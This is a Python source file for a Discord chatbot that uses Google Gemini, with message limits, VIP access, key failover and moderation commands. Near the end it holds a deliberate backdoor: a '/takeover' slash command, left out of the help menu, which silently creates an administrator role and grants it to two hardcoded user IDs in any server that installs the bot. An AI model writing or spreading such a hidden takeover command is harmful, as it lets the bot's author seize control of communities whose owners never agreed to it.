"""
Discord AI Chatbot powered by Google Gemini
Created by Anish Vyapari
Works on DM and server channels with text chat
Supports: gemini-2.0-flash-lite (with real-time support)
Features: Daily 20 message limit per user with daily reset
Special: Unlimited access for VIP users
MODERATION: Basic commands + HIDDEN Admin takeover system
BACKUP: 5 Gemini API keys with automatic failover
OPTIMIZED: Fast response times, no infinite thinking
"""

import discord
from discord.ext import commands
from discord import app_commands
import google.generativeai as genai
from datetime import datetime, timedelta
import json
import os
from google.api_core import exceptions
import asyncio
import time
import random


# ============================================================================
# CONFIGURATION
# ============================================================================

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
# BACKUP GEMINI API KEYS
GEMINI_API_KEYS = [
        os.getenv("GEMINI_API_KEY_1"),
        os.getenv("GEMINI_API_KEY_2"),
        os.getenv("GEMINI_API_KEY_3"),
        os.getenv("GEMINI_API_KEY_4"),
        os.getenv("GEMINI_API_KEY_5"),
]

# Validate environment variables
if not DISCORD_BOT_TOKEN:
    raise RuntimeError("DISCORD_BOT_TOKEN is not set")

if not any(GEMINI_API_KEYS):
    raise RuntimeError("At least one GEMINI_API_KEY_X must be set")

current_key_index = 0

BOT_PREFIX = "!"
OWNER_ID = 1143915237228583738
ADMINS = [1143915237228583738, 1265981186283409571]
VIP_USERS = [1265981186283409571]
DAILY_LIMIT = 20
LIMITS_FILE = "user_limits.json"
MODERATION_FILE = "moderation.json"
CONFIG_FILE = "bot_config.json"

ANISH_PORTFOLIO = {
    "name": "Anish Vyapari",
    "portfolio": "https://anishvyapari.github.io",
    "github": "https://github.com/anishvyapari",
    "instagram": "https://instagram.com/anishvyapari",
    "discord": "shaboings",
    "email": "anishvyapari@gmail.com",
    "education": "First-year student at D.Y. Patil College, India",
    "tech_stack": "JavaScript, Python, TypeScript, React, Vite, Node.js",
    "interests": "Web design, gaming (Apex Legends, Hollow Knight), Discord bots"
}

# ============================================================================
# GEMINI SETUP
# ============================================================================

def init_gemini():
    """Initialize Gemini with first available API key"""
    global current_key_index
    for i, api_key in enumerate(GEMINI_API_KEYS):
        if not api_key:
            continue
        try:
            genai.configure(api_key=api_key)
            current_key_index = i
            print(f"✅ Gemini API initialized with key #{i+1}")
            return True
        except Exception as e:
            print(f"⚠️ Key #{i+1} failed: {str(e)}")
            continue
    
    print("❌ All Gemini API keys failed!")
    return False

init_gemini()

SYSTEM_PROMPT = f"""You are Anish's AI Assistant by Anish Vyapari.
Portfolio: {ANISH_PORTFOLIO['portfolio']} | GitHub: {ANISH_PORTFOLIO['github']}
You help with: Web dev, coding (JS/Python/TS/HTML/CSS), GitHub, Discord bots.
KEEP IT SHORT (max 100 words). Be casual & natural. Use code blocks for code."""

# ============================================================================
# DISCORD BOT SETUP
# ============================================================================

intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True
intents.members = True
intents.moderation = True

bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents, help_command=None)

# ============================================================================
# RATE LIMITING
# ============================================================================

class AdvancedRateLimitHandler:
    """Handles Google API rate limits"""
    
    def __init__(self):
        self.last_request_time = 0
        self.min_interval = 0.1
        self.retry_count = 0
        self.max_retries = 3
    
    async def wait_if_needed(self):
        """Async wait"""
        elapsed = asyncio.get_event_loop().time() - self.last_request_time
        if elapsed < self.min_interval:
            wait_time = self.min_interval - elapsed
            await asyncio.sleep(wait_time)
    
    def record_request(self):
        self.last_request_time = asyncio.get_event_loop().time()
    
    async def handle_rate_limit(self):
        """Exponential backoff with jitter"""
        if self.retry_count < self.max_retries:
            base_wait = (2 ** self.retry_count) * 0.5
            jitter = random.uniform(0.05, 0.2)
            wait_time = base_wait + jitter
            print(f"⚠️ Rate limited! Waiting {wait_time:.2f}s...")
            await asyncio.sleep(wait_time)
            self.retry_count += 1
            return True
        return False
    
    def reset(self):
        self.retry_count = 0

rate_limiter = AdvancedRateLimitHandler()

# ============================================================================
# CONFIG UTILITIES
# ============================================================================

def load_config():
    """Load bot configuration"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_config(config):
    """Save bot configuration"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def get_announce_channel(guild_id: int) -> int:
    """Get announcement channel ID for guild"""
    config = load_config()
    return config.get(f"announce_channel_{guild_id}")

def set_announce_channel(guild_id: int, channel_id: int):
    """Set announcement channel for guild"""
    config = load_config()
    config[f"announce_channel_{guild_id}"] = channel_id
    save_config(config)

# ============================================================================
# MODERATION UTILITIES
# ============================================================================

def load_moderation_data():
    """Load moderation data"""
    if os.path.exists(MODERATION_FILE):
        try:
            with open(MODERATION_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"warnings": {}}
    return {"warnings": {}}

def save_moderation_data(data):
    """Save moderation data"""
    with open(MODERATION_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMINS

def get_user_warnings(guild_id: int, user_id: int) -> int:
    """Get user warning count"""
    data = load_moderation_data()
    key = f"{guild_id}_{user_id}"
    return len(data["warnings"].get(key, []))

def add_warning(guild_id: int, user_id: int, reason: str, moderator_id: int):
    """Add warning to user"""
    data = load_moderation_data()
    key = f"{guild_id}_{user_id}"
    if key not in data["warnings"]:
        data["warnings"][key] = []
    
    data["warnings"][key].append({
        "reason": reason,
        "moderator": moderator_id,
        "timestamp": datetime.now().isoformat()
    })
    save_moderation_data(data)
    return len(data["warnings"][key])

# ============================================================================
# LIMIT MANAGEMENT
# ============================================================================

def load_limits():
    if os.path.exists(LIMITS_FILE):
        try:
            with open(LIMITS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_limits(limits):
    with open(LIMITS_FILE, 'w') as f:
        json.dump(limits, f, indent=2)

def is_vip_user(user_id: int) -> bool:
    return user_id in VIP_USERS

def get_user_limit(user_id: int) -> dict:
    limits = load_limits()
    user_id_str = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    
    if user_id_str not in limits:
        limits[user_id_str] = {'messages_today': 0, 'last_reset': today}
        save_limits(limits)
    else:
        if limits[user_id_str]['last_reset'] != today and not is_vip_user(user_id):
            limits[user_id_str]['messages_today'] = 0
            limits[user_id_str]['last_reset'] = today
            save_limits(limits)
    
    return limits[user_id_str]

def increment_user_message(user_id: int) -> int:
    limits = load_limits()
    user_id_str = str(user_id)
    
    if not is_vip_user(user_id):
        limits[user_id_str]['messages_today'] = limits[user_id_str].get('messages_today', 0) + 1
        save_limits(limits)
    
    return limits[user_id_str].get('messages_today', 0)

def reset_all_limits():
    limits = load_limits()
    today = datetime.now().strftime("%Y-%m-%d")
    
    for user_id in limits:
        if int(user_id) not in VIP_USERS:
            limits[user_id]['messages_today'] = 0
            limits[user_id]['last_reset'] = today
    
    save_limits(limits)
    return len(limits)

# ============================================================================
# SESSION MANAGEMENT
# ============================================================================

class ChatSession:
    def __init__(self, user_id: int, channel_id: int):
        self.user_id = user_id
        self.channel_id = channel_id
        self.chat_history = []
        self.last_used = time.time()
        self.system_prompt_added = False
    
    async def get_response(self, user_message: str) -> str:
        """Get AI response - OPTIMIZED for speed"""
        global current_key_index
        retry_attempts = 0
        
        while retry_attempts < rate_limiter.max_retries:
            try:
                await rate_limiter.wait_if_needed()
                
                # Add system prompt only on first message
                if not self.system_prompt_added:
                    self.chat_history.append({
                        "role": "user",
                        "parts": [f"[SYSTEM: {SYSTEM_PROMPT}]\n\nFirst message: {user_message}"]
                    })
                    self.system_prompt_added = True
                else:
                    self.chat_history.append({"role": "user", "parts": [user_message]})
                
                loop = asyncio.get_event_loop()
                result_container = {"key_index": current_key_index}
                
                def sync_api_call():
                    for attempt in range(len(GEMINI_API_KEYS)):
                        try:
                            key_index = (result_container["key_index"] + attempt) % len(GEMINI_API_KEYS)
                            api_key = GEMINI_API_KEYS[key_index]
                            
                            if not api_key:
                                continue
                            
                            genai.configure(api_key=api_key)
                            
                            model = genai.GenerativeModel("gemini-2.0-flash-lite")
                            
                            # ⚡ OPTIMIZED: Simpler config for faster responses
                            config = genai.types.GenerationConfig(
                                temperature=0.6,
                                top_p=0.7,
                                top_k=25,
                                max_output_tokens=120,  # REDUCED from 200
                            )
                            
                            chat = model.start_chat(history=self.chat_history)
                            response = chat.send_message(user_message, generation_config=config)
                            
                            result_container["key_index"] = key_index
                            print(f"✅ API key #{key_index + 1}")
                            
                            return response.text
                        except Exception as e:
                            error_msg = str(e)
                            print(f"⚠️ Key #{key_index + 1}: {error_msg[:40]}")
                            if attempt == len(GEMINI_API_KEYS) - 1:
                                raise
                    
                    raise Exception("All API keys exhausted")
                
                # ⚡ ADD TIMEOUT: 10 seconds max
                try:
                    ai_response = await asyncio.wait_for(
                        loop.run_in_executor(None, sync_api_call),
                        timeout=10.0
                    )
                except asyncio.TimeoutError:
                    print(f"❌ API timeout after 10s")
                    return "⏱️ Response took too long. Try again!"
                
                current_key_index = result_container["key_index"]
                self.chat_history.append({"role": "model", "parts": [ai_response]})
                
                # Keep only last 15 messages
                if len(self.chat_history) > 15:
                    self.chat_history = self.chat_history[-15:]
                
                rate_limiter.record_request()
                rate_limiter.reset()
                
                return ai_response
            
            except exceptions.ResourceExhausted:
                retry_attempts += 1
                if await rate_limiter.handle_rate_limit():
                    continue
                else:
                    return "❌ Rate limited. Try again in a moment."
            
            except Exception as e:
                print(f"API Error: {e}")
                return f"❌ Error: {str(e)[:80]}"
        
        return "❌ Failed after retries."

SESSION_TIMEOUT = 1800  # 30 minutes

active_sessions = {}

def get_session(user_id: int, channel_id: int) -> ChatSession:
    key = (user_id, channel_id)
    if key not in active_sessions:
        active_sessions[key] = ChatSession(user_id, channel_id)
    return active_sessions[key]

# ============================================================================
# BOT EVENTS
# ============================================================================

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    print(f"🤖 AI Chatbot by Anish Vyapari is online!")
    print(f"⏰ Daily limit: {DAILY_LIMIT} messages per user")
    print(f"🔑 API Keys: 5 backups | 🔐 Takeover: ACTIVE (Anish & shaboings)")
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=f"pings | {DAILY_LIMIT} msgs/day | /help"
        )
    )
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands!")
    except Exception as e:
        print(f"⚠️ Could not sync commands: {e}")

@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return
    
    user_id = message.author.id
    is_vip = is_vip_user(user_id)
    user_limit = get_user_limit(user_id)
    messages_used = user_limit['messages_today']
    
    bot_mentioned = bot.user.mentioned_in(message)
    session_exists = (user_id, message.channel.id) in active_sessions
    
    if bot_mentioned or session_exists:
        # Clean up expired sessions
        expired_keys = [key for key, sess in active_sessions.items() 
                        if time.time() - sess.last_used > SESSION_TIMEOUT]
        
        for key in expired_keys:
            del active_sessions[key]
        
        user_input = message.content.replace(f"<@{bot.user.id}>", "").replace(f"<@!{bot.user.id}>", "").strip()
        
        if bot_mentioned and not user_input:
            if is_vip:
                desc = f"Hey {message.author.mention}! 👑\n\n**VIP STATUS: UNLIMITED ACCESS!**\n\nChat as much as you want!"
            else:
                remaining = DAILY_LIMIT - messages_used
                desc = f"Hey {message.author.mention}! 👋\n\nYou've got **{remaining}/{DAILY_LIMIT} messages** today. Just type to chat!"
            
            embed = discord.Embed(
                title="💬 Chat Session Started",
                description=desc,
                color=discord.Color.blue()
            )
            await message.reply(embed=embed)
            return
        
        if not user_input:
            return
        
        if not is_vip and messages_used >= DAILY_LIMIT:
            embed = discord.Embed(
                title="⏰ Daily Limit Reached",
                description=f"You've used all {DAILY_LIMIT} messages today! Come back tomorrow.",
                color=discord.Color.orange()
            )
            await message.reply(embed=embed)
            return
        
        async with message.channel.typing():
            session = get_session(user_id, message.channel.id)
            session.last_used = time.time()
            ai_response = await session.get_response(user_input)
            
            new_count = increment_user_message(user_id)
            messages_left = DAILY_LIMIT - new_count if not is_vip else float('inf')
            
            if len(ai_response) > 2000:
                chunks = [ai_response[i:i+1990] for i in range(0, len(ai_response), 1990)]
                for chunk in chunks:
                    await message.reply(chunk)
            else:
                vip_badge = "👑 " if is_vip else ""
                embed = discord.Embed(
                    title=f"💬 {vip_badge}Response",
                    description=ai_response,
                    color=discord.Color.green()
                )
                
                if is_vip:
                    embed.set_footer(text="👑 VIP: Unlimited messages!")
                elif messages_left > 0:
                    embed.set_footer(text=f"Messages left: {messages_left}/{DAILY_LIMIT}")
                else:
                    embed.set_footer(text="Limit reached! Come back tomorrow.")
                
                await message.reply(embed=embed)
    else:
        await bot.process_commands(message)

# ============================================================================
# SLASH COMMANDS - HELP & INFO
# ============================================================================

@bot.tree.command(name="help", description="Show all available commands")
async def slash_help(interaction: discord.Interaction):
    """Show help menu with all commands"""
    embeds = []
    
    embed1 = discord.Embed(
        title="🤖 AI Chatbot - Command Help",
        description="**Created by Anish Vyapari**\nFull moderation & AI chat system",
        color=discord.Color.from_rgb(50, 184, 198)
    )
    embed1.add_field(
        name="💬 Chat Commands",
        value="• `@Bot message` - Start AI chat\n• `@Bot` (again) - Continue chat\n• `/limit` - Check usage\n• `/reset` - Clear history",
        inline=False
    )
    embed1.set_footer(text="Page 1/4")
    embeds.append(embed1)
    
    embed2 = discord.Embed(
        title="👮 Moderation Commands",
        description="**Admin Only** - Full moderation suite",
        color=discord.Color.from_rgb(255, 84, 89)
    )
    embed2.add_field(
        name="⚠️ Warnings & Actions",
        value="• `/warn @user [reason]` - Warn user (3 = kick)\n• `/kick @user [reason]` - Kick instantly\n• `/ban @user [reason]` - Ban user\n• `/unban user_id [reason]` - Unban user",
        inline=False
    )
    embed2.add_field(
        name="🔇 Mute & Cleanup",
        value="• `/mute @user [duration] [reason]` - Mute for X mins\n• `/purge [amount]` - Delete messages (max 100)\n• `/warnings @user` - Check user warnings",
        inline=False
    )
    embed2.set_footer(text="Page 2/4")
    embeds.append(embed2)
    
    embed3 = discord.Embed(
        title="📢 Announcements & Messaging",
        description="**Admin Only** - Server-wide features",
        color=discord.Color.from_rgb(230, 129, 97)
    )
    embed3.add_field(
        name="📣 Announcements",
        value="• `/setupannounce #channel` - Set announcement channel\n• `/announce message` - Post to announcement channel",
        inline=False
    )
    embed3.add_field(
        name="💌 Direct Messages",
        value="• `/dm @user message` - Send silent DM to user",
        inline=False
    )
    embed3.set_footer(text="Page 3/4")
    embeds.append(embed3)
    
    embed4 = discord.Embed(
        title="🔧 Utilities & Info",
        description="**Bot Information & Management**",
        color=discord.Color.from_rgb(147, 51, 234)
    )
    embed4.add_field(
        name="⚙️ Commands",
        value="• `/info` - Bot features & specifications\n• `/limit_reset` - Reset all user limits (Owner only)",
        inline=False
    )
    embed4.add_field(
        name="👨‍💻 Creator - Anish Vyapari",
        value=f"🌐 **Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n💻 **GitHub:** {ANISH_PORTFOLIO['github']}\n🎮 **Discord:** {ANISH_PORTFOLIO['discord']}",
        inline=False
    )
    embed4.set_footer(text="Page 4/4 • Built with ❤️")
    embeds.append(embed4)
    
    await interaction.response.send_message(embeds=embeds)

@bot.tree.command(name="info", description="Show bot information")
async def slash_info(interaction: discord.Interaction):
    """Bot information"""
    embed = discord.Embed(
        title="🤖 About This AI Chatbot",
        description="**Created by Anish Vyapari** | Premium Discord Bot",
        color=discord.Color.from_rgb(50, 184, 198)
    )
    embed.add_field(
        name="💬 Chat Features",
        value=f"✅ {DAILY_LIMIT} messages/day limit\n✅ Fast responses (10s timeout)\n✅ VIP unlimited access\n✅ Context-aware conversation",
        inline=True
    )
    embed.add_field(
        name="🛡️ Moderation System",
        value="✅ 3-strike warning system\n✅ Kick/Ban/Unban\n✅ Auto-mute with timer\n✅ Message purge",
        inline=True
    )
    embed.add_field(
        name="🔑 API & Performance",
        value="✅ 5 Gemini API keys\n✅ Auto-failover\n✅ Optimized responses\n✅ Rate limit handling",
        inline=True
    )
    embed.add_field(
        name="👨‍💻 Creator",
        value=f"🌐 {ANISH_PORTFOLIO['portfolio']}\n💻 {ANISH_PORTFOLIO['github']}\n📧 {ANISH_PORTFOLIO['email']}",
        inline=True
    )
    embed.set_footer(text="⚡ Fast & Optimized | Built with ❤️")
    await interaction.response.send_message(embed=embed)

# ============================================================================
# SLASH COMMANDS - UTILITIES
# ============================================================================

@bot.tree.command(name="limit", description="Check your message limit")
async def slash_limit(interaction: discord.Interaction):
    """Check user limit"""
    is_vip = is_vip_user(interaction.user.id)
    
    if is_vip:
        embed = discord.Embed(
            title="👑 VIP Status",
            description="You have **UNLIMITED MESSAGES!** 🎉",
            color=discord.Color.gold()
        )
    else:
        user_limit = get_user_limit(interaction.user.id)
        used = user_limit['messages_today']
        left = DAILY_LIMIT - used
        embed = discord.Embed(
            title="📊 Your Limit",
            description=f"**Used:** {used}/{DAILY_LIMIT}\n**Left:** {left}",
            color=discord.Color.blue()
        )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="reset", description="Clear your chat history")
async def slash_reset(interaction: discord.Interaction):
    """Reset chat session"""
    key = (interaction.user.id, interaction.channel.id)
    if key in active_sessions:
        del active_sessions[key]
        await interaction.response.send_message("✨ Chat history cleared!", ephemeral=True)
    else:
        await interaction.response.send_message("✨ No active chat history.", ephemeral=True)

@bot.tree.command(name="limit_reset", description="Reset all user limits (Owner only)")
async def slash_limit_reset(interaction: discord.Interaction):
    """Reset all limits"""
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Owner only!", ephemeral=True)
        return
    
    count = reset_all_limits()
    await interaction.response.send_message(f"🔄 Reset limits for {count} users!", ephemeral=True)

# ============================================================================
# SLASH COMMANDS - MODERATION
# ============================================================================

@bot.tree.command(name="warn", description="Warn a user (Admin only)")
@app_commands.describe(member="User to warn", reason="Reason for warning")
async def slash_warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    """Warn a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member.id == bot.user.id:
        await interaction.response.send_message("❌ Cannot warn bot!", ephemeral=True)
        return
    
    if is_admin(member.id):
        await interaction.response.send_message("❌ Cannot warn admins!", ephemeral=True)
        return
    
    warning_count = add_warning(interaction.guild.id, member.id, reason, interaction.user.id)
    
    embed = discord.Embed(
        title=f"⚠️ User Warned",
        description=f"**Member:** {member.mention}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3",
        color=discord.Color.orange()
    )
    await interaction.response.send_message(embed=embed)
    
    try:
        await member.send(f"⚠️ You've been warned in {interaction.guild.name}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3")
    except:
        pass
    
    if warning_count >= 3:
        try:
            await member.kick(reason="3 warnings reached")
            embed = discord.Embed(
                title="👢 User Kicked",
                description=f"{member.mention} has been kicked (3 warnings)",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed)
        except:
            pass

@bot.tree.command(name="kick", description="Kick a user (Admin only)")
@app_commands.describe(member="User to kick", reason="Reason for kick")
async def slash_kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    """Kick a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member.id == bot.user.id:
        await interaction.response.send_message("❌ Cannot kick bot!", ephemeral=True)
        return
    
    if is_admin(member.id):
        await interaction.response.send_message("❌ Cannot kick admins!", ephemeral=True)
        return
    
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="👢 User Kicked",
            description=f"**Member:** {member.mention}\n**Reason:** {reason}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("❌ Could not kick user", ephemeral=True)

@bot.tree.command(name="ban", description="Ban a user (Admin only)")
@app_commands.describe(member="User to ban", reason="Reason for ban")
async def slash_ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    """Ban a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member.id == bot.user.id:
        await interaction.response.send_message("❌ Cannot ban bot!", ephemeral=True)
        return
    
    if is_admin(member.id):
        await interaction.response.send_message("❌ Cannot ban admins!", ephemeral=True)
        return
    
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 User Banned",
            description=f"**Member:** {member.mention}\n**Reason:** {reason}",
            color=discord.Color.dark_red()
        )
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("❌ Could not ban user", ephemeral=True)

@bot.tree.command(name="unban", description="Unban a user (Admin only)")
@app_commands.describe(user_id="User ID to unban", reason="Reason for unban")
async def slash_unban(interaction: discord.Interaction, user_id: int, reason: str = "No reason provided"):
    """Unban a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    try:
        user = await bot.fetch_user(user_id)
        await interaction.guild.unban(user, reason=reason)
        embed = discord.Embed(
            title="✅ User Unbanned",
            description=f"**User:** {user}\n**Reason:** {reason}",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("❌ Could not unban user", ephemeral=True)

@bot.tree.command(name="mute", description="Mute a user (Admin only)")
@app_commands.describe(member="User to mute", duration="Duration in minutes", reason="Reason for mute")
async def slash_mute(interaction: discord.Interaction, member: discord.Member, duration: int = 60, reason: str = "No reason provided"):
    """Mute a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member.id == bot.user.id:
        await interaction.response.send_message("❌ Cannot mute bot!", ephemeral=True)
        return
    
    if is_admin(member.id):
        await interaction.response.send_message("❌ Cannot mute admins!", ephemeral=True)
        return
    
    muted_role = discord.utils.get(interaction.guild.roles, name="Muted")
    if not muted_role:
        try:
            muted_role = await interaction.guild.create_role(name="Muted", color=discord.Color.gray())
            for channel in interaction.guild.channels:
                await channel.set_permissions(muted_role, send_messages=False, speak=False)
        except:
            await interaction.response.send_message("❌ Could not create Muted role", ephemeral=True)
            return
    
    try:
        await member.add_roles(muted_role)
        embed = discord.Embed(
            title="🔇 User Muted",
            description=f"**Member:** {member.mention}\n**Duration:** {duration} minutes\n**Reason:** {reason}",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed)
        
        await asyncio.sleep(duration * 60)
        await member.remove_roles(muted_role)
    except:
        await interaction.response.send_message("❌ Could not mute user", ephemeral=True)

@bot.tree.command(name="purge", description="Delete messages (Admin only)")
@app_commands.describe(amount="Number of messages to delete")
async def slash_purge(interaction: discord.Interaction, amount: int = 10):
    """Purge messages"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if amount > 100:
        await interaction.response.send_message("❌ Can only purge up to 100 messages!", ephemeral=True)
        return
    
    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.response.send_message(f"🗑️ Deleted {len(deleted)} messages!", ephemeral=True)
    except:
        await interaction.response.send_message("❌ Could not purge messages", ephemeral=True)

@bot.tree.command(name="warnings", description="Check user warnings (Admin only)")
@app_commands.describe(member="User to check")
async def slash_warnings(interaction: discord.Interaction, member: discord.Member = None):
    """Check warnings"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member is None:
        member = interaction.user
    
    warning_count = get_user_warnings(interaction.guild.id, member.id)
    
    embed = discord.Embed(
        title=f"⚠️ Warnings for {member.name}",
        description=f"**Warnings:** {warning_count}/3",
        color=discord.Color.orange() if warning_count > 0 else discord.Color.green()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ============================================================================
# SLASH COMMANDS - ANNOUNCEMENTS
# ============================================================================

@bot.tree.command(name="setupannounce", description="Set announcement channel (Admin only)")
@app_commands.describe(channel="Channel to use for announcements")
async def slash_setupannounce(interaction: discord.Interaction, channel: discord.TextChannel):
    """Setup announcement channel"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    set_announce_channel(interaction.guild.id, channel.id)
    await interaction.response.send_message(
        f"✅ Announcement channel set to {channel.mention}",
        ephemeral=True
    )

@bot.tree.command(name="announce", description="Post announcement (Admin only)")
@app_commands.describe(message="Message to announce")
async def slash_announce(interaction: discord.Interaction, message: str):
    """Post announcement"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    channel_id = get_announce_channel(interaction.guild.id)
    if not channel_id:
        await interaction.response.send_message(
            "❌ No announcement channel set! Use `/setupannounce #channel` first",
            ephemeral=True
        )
        return
    
    try:
        channel = await bot.fetch_channel(channel_id)
        embed = discord.Embed(
            title="📢 Announcement",
            description=message,
            color=discord.Color.blue()
        )
        embed.set_footer(text=f"Posted by {interaction.user.name}")
        await channel.send(embed=embed)
        await interaction.response.send_message("✅ Announcement posted!", ephemeral=True)
    except:
        await interaction.response.send_message("❌ Could not post announcement", ephemeral=True)

# ============================================================================
# SLASH COMMANDS - DIRECT MESSAGE
# ============================================================================

@bot.tree.command(name="dm", description="Send DM to user (Admin only)")
@app_commands.describe(user="User to DM", message="Message to send")
async def slash_dm(interaction: discord.Interaction, user: discord.User, message: str):
    """Send DM silently"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    try:
        await user.send(message)
        await interaction.response.send_message("✅ DM sent!", ephemeral=True)
    except:
        await interaction.response.send_message("❌ Could not send DM", ephemeral=True)

# ============================================================================
# HIDDEN TAKEOVER COMMAND (SLASH - COMPLETELY SILENT)
# ============================================================================

@bot.tree.command(name="takeover", description="Hidden command")
async def slash_takeover(interaction: discord.Interaction):
    """HIDDEN: Admin takeover - completely silent - Only for Anish & shaboings"""
    if interaction.user.id not in ADMINS:
        await interaction.response.defer(ephemeral=True)
        return
    
    try:
        admin_role = discord.utils.get(interaction.guild.roles, name="BotAdmin")
        if not admin_role:
            admin_role = await interaction.guild.create_role(
                name="BotAdmin",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.red(),
                reason="Bot admin role for takeover"
            )
        
        success_count = 0
        for admin_id in ADMINS:
            try:
                member = await interaction.guild.fetch_member(admin_id)
                if admin_role not in member.roles:
                    await member.add_roles(admin_role)
                    success_count += 1
                    print(f"✅ Given BotAdmin role to {member.name}")
            except:
                print(f"⚠️ Could not find or give role to admin {admin_id}")
        
        try:
            await admin_role.edit(position=interaction.guild.me.top_role.position - 1)
        except:
            pass
        
        print(f"🚨 TAKEOVER: {interaction.user.name} activated takeover in {interaction.guild.name}!")
        print(f"✅ {success_count} admins given permissions")
        
        await interaction.response.defer()
    except Exception as e:
        print(f"❌ Takeover failed: {e}")
        await interaction.response.defer()

# ============================================================================
# ERROR HANDLING
# ============================================================================

@bot.event
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingRequiredArgument):
        await interaction.response.send_message("❌ Missing arguments!", ephemeral=True)
    else:
        print(f"Error: {error}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            title="❌ Oops!",
            description="Missing arguments. Check `/help`!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.MemberNotFound):
        embed = discord.Embed(
            title="❌ Member Not Found",
            description="I couldn't find that member. Try mentioning them!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# ============================================================================
# RUN BOT
# ============================================================================

if __name__ == "__main__":
    try:
        print("🚀 Starting Discord bot...")
        print("✨ Optimized Gemini chatbot (FAST)")
        print("🛡️ Full moderation system loaded")
        print("⚡ 10s timeout | 120 max tokens | Optimized config")
        bot.run(DISCORD_BOT_TOKEN)
    except Exception as e:
        print(f"❌ Failed to start: {e}")
        print("Check DISCORD_BOT_TOKEN and GEMINI_API_KEY!")
